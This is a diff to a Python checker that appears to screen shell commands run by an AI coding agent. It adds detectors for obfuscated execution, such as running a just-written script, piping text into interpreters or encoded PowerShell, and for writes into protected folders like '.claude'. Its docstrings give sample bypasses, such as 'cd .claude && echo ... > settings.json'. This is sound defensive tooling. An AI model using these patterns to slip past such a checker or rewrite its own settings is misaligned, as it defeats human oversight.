+def _runs_what_it_wrote(commands: list[_Command]) -> list[Finding]:
+    """echo 'curl x' > a.sh; bash a.sh (or ./a.sh) runs text the reader saw only as data: obfuscation."""
+    written = set()
+    for command in commands:
+        targets = list(command.targets)
+        if command.program in _TEXT_WRITERS:
+            targets.extend(_write_targets(command.words))
+        written.update(_plain_path(target) for target in targets if target.lower() not in _NOT_FILES)
+    if not written:
+        return []
+    for command in commands:
+        for word in (_script_of(command), command.written):
+            if word and _plain_path(word) in written:
+                return [_finding(OBFUSCATION, command, f"it runs '{word}', which this command line writes")]
+    return []
+
+
+def _plain_path(word: str) -> str:
+    return posixpath.normpath(word.replace("\\", "/")) if word else word
+
+
+def _writes_after_changing_folder(commands: list[_Command]) -> list[Finding]:
+    """cd .claude && echo '{}' > settings.json writes Claude Code's settings by a name no pattern sees: a line
+    that changes into a protected folder (cd, pushd, Set-Location, env -C, git -C ...) and runs anything that
+    may write (a redirection to a file, or a program not known to only read) is config_write."""
+    folder = next((found for found in map(_changed_into, commands) if found), None)
+    if folder is None:
+        return []
+    for command in commands:
+        if _may_write(command):
+            what = f"program '{command.program}'" if command.program else "a redirection"
+            return [_finding(CONFIG_WRITE, command, f"{what} after changing into '{folder}'")]
+    return []
+
+
+def _changed_into(command: _Command) -> str | None:
+    """The protected folder this command changes into (or runs its program in), if any."""
+    folders = list(command.chdir)
+    if command.program in _CD_PROGRAMS:
+        folders.extend(_write_targets(command.words))
+    for folder in folders:
+        if _protected(folder) or any(_PROTECTED_FOLDER.search(spelling) for spelling in _spellings(folder)):
+            return folder
+    return None
+
+
+def _may_write(command: _Command) -> bool:
+    """True unless the command is known to only read: no redirection to a file, and a program that only reads."""
+    if any(target.lower() not in _NOT_FILES for target in command.targets):
+        return True
+    program = command.program
+    if not program:
+        return command.shell == "powershell" and bool(command.words)  # an expression may call .NET
+    if program == "git":
+        subcommand = _positional(command.words, _GIT_OPTIONS_WITH_VALUE)[:1]
+        return not (subcommand and subcommand[0].lower() in _GIT_READ_ONLY)
+    if program == "find":
+        return any(word in ("-delete", "-fprint", "-fprint0", "-fprintf", "-fls") for word in command.words)
+    return program not in _READ_ONLY_PROGRAMS
 
 
 def _finding(kind: str, command: _Command, evidence: str) -> Finding:
@@ -1301,6 +1681,7 @@ def _config_write(command: _Command, earlier: list[_Command]) -> str | None:
     program, words = command.program, command.words
     writes = program in _PROGRAM_WRITERS or (
         program in _IN_PLACE_EDITORS and any(word.startswith(("-i", "--in-place", "-pi")) for word in words)) or (
+        program == "tar" and _tar_extracts(words)) or (
         command.shell == "powershell" and any(_DOTNET_WRITE.search(word) for word in (command.written, *words)))
     if writes:
         for word in (*_write_targets(words), *command.groups):
@@ -1317,19 +1698,107 @@ def _obfuscation(command: _Command, earlier: list[_Command]) -> str | None:
         return f"program '{program}'"
     if program in _POWERSHELLS:
         for word in words:
-            if word[:1] in ("-", "/"):
-                option = word.lstrip("-/").lower()
-                if option == "ec" or (option.startswith("e") and "encodedcommand".startswith(option)):
-                    return f"program '{program}' with {word}"
-    if program in _POSIX_SHELLS:
-        script = _shell_script(program, list(words))
-        if script is not None and (_SUBST in script[0] or "$(" in script[0] or "`" in script[0]):
-            return f"program '{program} -c' with a command substitution"
+            if word and word[0] in _DASHES + "/" and _encoded_command_option(word.lstrip(_DASHES + "/").lower()):
+                return f"program '{program}' with {word}"
+    call = _shell_call(program, list(words))
+    if call is not None:
+        texts = [text for text, _ in call.texts]
+        if any(_SUBST in text for text in texts) or program in _POSIX_SHELLS and any(
+                "$(" in text or "`" in text for text in texts):
+            return f"program '{program}' with a command substitution in the command it runs"
+        if call.stdin and command.position > 0:
+            return f"text piped into '{program}', which runs it"
+        if command.fed is not None and (call.missing or command.fed and any(command.fed in text for text in texts)):
+            return f"text from its input run by '{program}' (xargs or parallel)"
+    if command.position > 0 and (_language_reads_input(command) or program == "parallel"):
+        return f"text piped into '{program}', which runs it"
+    if _script_of(command) == _SUBST:
+        return f"program '{program}' runs a command's output as its script"
     if program in _INTERPRETERS and any(_decodes(other) for other in earlier):
         return f"decoded text piped to '{program}'"
     if command.shell == "powershell" and any(_DOTNET_DECODE.search(word) for word in (program, *words)):
         return "[Convert]::FromBase64String"
     return None
+
+
+# Languages that run code given inline (python -c, node -e, perl -ne ...), a script file, or their input.
+_INLINE_CODE_OPTIONS = {
+    "node": re.compile(r"-[ep]+|--(eval|print)(=.*)?", re.DOTALL),
+    "perl": re.compile(r"-[A-Za-z]*[eE]"),
+    "ruby": re.compile(r"-[A-Za-z]*e"),
+    "php": re.compile(r"-[A-Za-z]*[rBRE]"),
+    "lua": re.compile(r"-e"),
+}
+_INLINE_CODE_OPTIONS["nodejs"] = _INLINE_CODE_OPTIONS["node"]
+_INLINE_CODE_OPTIONS["luajit"] = _INLINE_CODE_OPTIONS["lua"]
+
+
+def _language_reads_input(command: _Command) -> bool:
+    """True if a language interpreter takes the code it runs from its standard input (echo 'x' | python)."""
+    program, words = command.program, list(command.words)
+    if _PYTHONS.fullmatch(program):
+        return _python_source(words)[0] == "stdin"
+    inline = _INLINE_CODE_OPTIONS.get(program)
+    if inline is None:
+        return program in ("deno", "bun", "source", ".") and any(word in _STDIN_NAMES for word in words)
+    for word in words:
+        if word in _STDIN_NAMES:
+            return True
+        if not word.startswith("-") or inline.fullmatch(word):
+            return False  # a script file, or code given inline
+    return True
+
+
+def _python_source(words: list[str]) -> tuple[str, str | None]:
+    """Where python takes the code it runs: "inline" (-c), "module" (-m), "file" (with the file) or "stdin"."""
+    i, n = 0, len(words)
+    while i < n:
+        word = words[i]
+        if word in _STDIN_NAMES:
+            return "stdin", None
+        if word == "--":
+            i += 1
+            break
+        if not word.startswith("-"):
+            return "file", word
+        i += 1
+        if word.startswith("--"):
+            i += 1 if word == "--check-hash-based-pycs" else 0
+            continue
+        letters = word[1:]
+        for at, letter in enumerate(letters):
+            if letter == "c":
+                return "inline", None
+            if letter == "m":
+                return "module", None
+            if letter in "WX":
+                i += 1 if at + 1 == len(letters) else 0  # -W ignore, or -Wignore
+                break
+    if i < n and words[i] not in _STDIN_NAMES:
+        return "file", words[i]
+    return "stdin", None
+
+
+def _script_of(command: _Command) -> str | None:
+    """The script file a shell or an interpreter runs (bash -o pipefail x.sh, python -X dev x.py), if any."""
+    call = _shell_call(command.program, list(command.words))
+    if call is not None:
+        return call.script
+    if _PYTHONS.fullmatch(command.program):
+        return _python_source(list(command.words))[1]
+    if command.program in _INTERPRETERS:
+        first = _positional(command.words)[:1]
+        return first[0] if first else None
+    return None
+
+
+def _tar_extracts(words: Iterable[str]) -> bool:
+    """tar -xf, tar xzf, tar --extract: tar writes the archive's files (into the folder after -C)."""
+    words = list(words)
+    if any(word in ("--extract", "--get") for word in words):
+        return True
+    return any(re.fullmatch(r"-[A-Za-z]*x[A-Za-z]*", word) for word in words) or bool(
+        words and re.fullmatch(r"[A-Za-z]*x[A-Za-z]*", words[0]))
 
 
 def _decodes(command: _Command) -> bool:
